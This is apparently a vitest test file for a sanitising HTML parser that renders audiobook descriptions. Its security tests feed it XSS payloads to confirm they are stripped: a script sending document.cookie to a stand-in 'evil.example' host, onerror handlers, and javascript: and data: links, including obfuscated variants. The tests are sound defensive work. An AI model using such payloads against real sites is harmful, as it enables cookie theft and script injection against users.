import { describe, expect, it } from 'vitest';
import { parseDescriptionHtml, type DescriptionNode } from './parseDescriptionHtml.js';

/** Flattens the AST back to plain text, the way a screen reader or a `.textContent` read would see it. */
function textOf(nodes: DescriptionNode[]): string {
  return nodes
    .map((node) => {
      switch (node.type) {
        case 'text':
          return node.value;
        case 'break':
          return '\n';
        default:
          return textOf(node.children);
      }
    })
    .join('');
}

describe('parseDescriptionHtml — the reported bug', () => {
  it('turns the Audiobookshelf HTML from the bug report into readable text with real emphasis and line breaks', () => {
    const html =
      '<p><b>This program is read by the author.<br />"If ever a book was necessary, it\'s this one." —Bill McKibben<br /></b>A clear-eyed account of the climate crisis.</p>';

    const nodes = parseDescriptionHtml(html);

    expect(nodes).toEqual([
      {
        type: 'paragraph',
        children: [
          {
            type: 'bold',
            children: [
              { type: 'text', value: 'This program is read by the author.' },
              { type: 'break' },
              {
                type: 'text',
                value: '"If ever a book was necessary, it\'s this one." —Bill McKibben',
              },
              { type: 'break' },
            ],
          },
          { type: 'text', value: 'A clear-eyed account of the climate crisis.' },
        ],
      },
    ]);
    // No literal markup should be readable anywhere in the flattened text.
    expect(textOf(nodes)).not.toContain('<p>');
    expect(textOf(nodes)).not.toContain('<b>');
    expect(textOf(nodes)).not.toContain('<br');
  });

  it('renders italics, unordered lists and ordered lists', () => {
    const nodes = parseDescriptionHtml(
      '<p>An <i>Auralis</i> original.</p><ul><li>Chapter one</li><li>Chapter two</li></ul><ol><li>First</li></ol>',
    );

    expect(nodes).toEqual([
      {
        type: 'paragraph',
        children: [
          { type: 'text', value: 'An ' },
          { type: 'italic', children: [{ type: 'text', value: 'Auralis' }] },
          { type: 'text', value: ' original.' },
        ],
      },
      {
        type: 'list',
        ordered: false,
        children: [
          { type: 'listItem', children: [{ type: 'text', value: 'Chapter one' }] },
          { type: 'listItem', children: [{ type: 'text', value: 'Chapter two' }] },
        ],
      },
      {
        type: 'list',
        ordered: true,
        children: [{ type: 'listItem', children: [{ type: 'text', value: 'First' }] }],
      },
    ]);
  });

  it('collapses <strong>/<em> onto the same bold/italic nodes as <b>/<i>', () => {
    const nodes = parseDescriptionHtml('<strong>bold</strong> and <em>emphasised</em>');

    expect(nodes).toEqual([
      { type: 'bold', children: [{ type: 'text', value: 'bold' }] },
      { type: 'text', value: ' and ' },
      { type: 'italic', children: [{ type: 'text', value: 'emphasised' }] },
    ]);
  });
});

describe('parseDescriptionHtml — links', () => {
  it('keeps an https link, decorated with a validated href', () => {
    const nodes = parseDescriptionHtml(
      '<a href="https://example.com/author">the author\'s site</a>',
    );

    expect(nodes).toEqual([
      {
        type: 'link',
        href: 'https://example.com/author',
        children: [{ type: 'text', value: "the author's site" }],
      },
    ]);
  });

  it('keeps a mailto link', () => {
    const nodes = parseDescriptionHtml('<a href="mailto:author@example.com">email the author</a>');

    expect(nodes).toEqual([
      {
        type: 'link',
        href: 'mailto:author@example.com',
        children: [{ type: 'text', value: 'email the author' }],
      },
    ]);
  });

  it('drops a relative link to plain text rather than guessing a base to resolve it against', () => {
    const nodes = parseDescriptionHtml('<a href="/books/dune">more like this</a>');

    expect(nodes).toEqual([{ type: 'text', value: 'more like this' }]);
  });

  it('drops a link with no href to plain text', () => {
    const nodes = parseDescriptionHtml('<a>click here</a>');

    expect(nodes).toEqual([{ type: 'text', value: 'click here' }]);
  });
});

describe('parseDescriptionHtml — security', () => {
  it('never renders a <script> tag or lets its content survive as text', () => {
    const nodes = parseDescriptionHtml(
      '<p>Before.</p><script>fetch("https://evil.example/steal?c="+document.cookie)</script><p>After.</p>',
    );

    expect(nodes).toEqual([
      { type: 'paragraph', children: [{ type: 'text', value: 'Before.' }] },
      { type: 'paragraph', children: [{ type: 'text', value: 'After.' }] },
    ]);
    expect(textOf(nodes)).not.toContain('fetch');
    expect(textOf(nodes)).not.toContain('document.cookie');
  });

  it('never renders <style> content either', () => {
    const nodes = parseDescriptionHtml('<style>body{display:none}</style><p>Visible.</p>');

    expect(nodes).toEqual([{ type: 'paragraph', children: [{ type: 'text', value: 'Visible.' }] }]);
  });

  it('drops an unterminated <script> tag and everything after it, rather than leaking its source as text', () => {
    const nodes = parseDescriptionHtml('<p>Safe.</p><script>alert(1)');

    expect(nodes).toEqual([{ type: 'paragraph', children: [{ type: 'text', value: 'Safe.' }] }]);
  });

  it('strips every attribute from a paragraph, including an event handler, and produces no attribute at all', () => {
    const nodes = parseDescriptionHtml(
      '<p onclick="alert(1)" onmouseover="alert(2)">Click-free.</p>',
    );

    expect(nodes).toEqual([
      { type: 'paragraph', children: [{ type: 'text', value: 'Click-free.' }] },
    ]);
  });

  it('strips an onerror attribute from an unknown tag like <img>, and the tag contributes no node', () => {
    const nodes = parseDescriptionHtml('<img src="x" onerror="alert(1)" />Rest of the sentence.');

    expect(nodes).toEqual([{ type: 'text', value: 'Rest of the sentence.' }]);
  });

  it('never turns a javascript: URL into a live link — it degrades to the link text', () => {
    const nodes = parseDescriptionHtml('<a href="javascript:alert(1)">click me</a>');

    expect(nodes).toEqual([{ type: 'text', value: 'click me' }]);
  });

  it('rejects a javascript: scheme even when case-mixed or containing embedded whitespace to dodge a naive check', () => {
    expect(parseDescriptionHtml('<a href="JavaScript:alert(1)">x</a>')).toEqual([
      { type: 'text', value: 'x' },
    ]);
    expect(parseDescriptionHtml('<a href="java\tscript:alert(1)">x</a>')).toEqual([
      { type: 'text', value: 'x' },
    ]);
  });

  it('never turns a data: URL into a live link', () => {
    const nodes = parseDescriptionHtml(
      '<a href="data:text/html,<script>alert(1)</script>">click me</a>',
    );

    expect(nodes).toEqual([{ type: 'text', value: 'click me' }]);
  });

  it('degrades malformed, unclosed markup to readable text instead of throwing', () => {
    expect(() => parseDescriptionHtml('<p>Unclosed paragraph with <b>bold text')).not.toThrow();
    const nodes = parseDescriptionHtml('<p>Unclosed paragraph with <b>bold text');

    expect(nodes).toEqual([
      {
        type: 'paragraph',
        children: [
          { type: 'text', value: 'Unclosed paragraph with ' },
          { type: 'bold', children: [{ type: 'text', value: 'bold text' }] },
        ],
      },
    ]);
  });

  it('degrades a truncated tag with no closing ">" to literal text instead of throwing', () => {
    expect(() => parseDescriptionHtml('Broken <a href="https://example.com')).not.toThrow();
    const nodes = parseDescriptionHtml('Broken <a href="https://example.com');

    expect(nodes).toEqual([{ type: 'text', value: 'Broken <a href="https://example.com' }]);
  });

  it('auto-closes a mismatched close tag rather than throwing or dropping the content', () => {
    expect(() => parseDescriptionHtml('<p>one <b>two</p> three</b>')).not.toThrow();
  });

  it('never throws on a stray "<" that is not a tag at all', () => {
    expect(() => parseDescriptionHtml('5 < 10 and 10 > 5')).not.toThrow();
    expect(textOf(parseDescriptionHtml('5 < 10 and 10 > 5'))).toBe('5 < 10 and 10 > 5');
  });
});

describe('parseDescriptionHtml — degenerate input', () => {
  it('renders nothing for an absent description', () => {
    expect(parseDescriptionHtml(undefined)).toEqual([]);
    expect(parseDescriptionHtml(null)).toEqual([]);
  });

  it('renders nothing for an empty description', () => {
    expect(parseDescriptionHtml('')).toEqual([]);
  });

  it('decodes common named and numeric HTML entities in plain text', () => {
    const nodes = parseDescriptionHtml(
      'Tom &amp; Jerry &mdash; est. &#39;1940&#39; &#x2014; forever',
    );

    expect(textOf(nodes)).toBe("Tom & Jerry — est. '1940' — forever");
  });

  it('auto-closes a re-opened <p> the way a browser would, rather than nesting paragraphs', () => {
    const nodes = parseDescriptionHtml('<p>First<p>Second');

    expect(nodes).toEqual([
      { type: 'paragraph', children: [{ type: 'text', value: 'First' }] },
      { type: 'paragraph', children: [{ type: 'text', value: 'Second' }] },
    ]);
  });
});
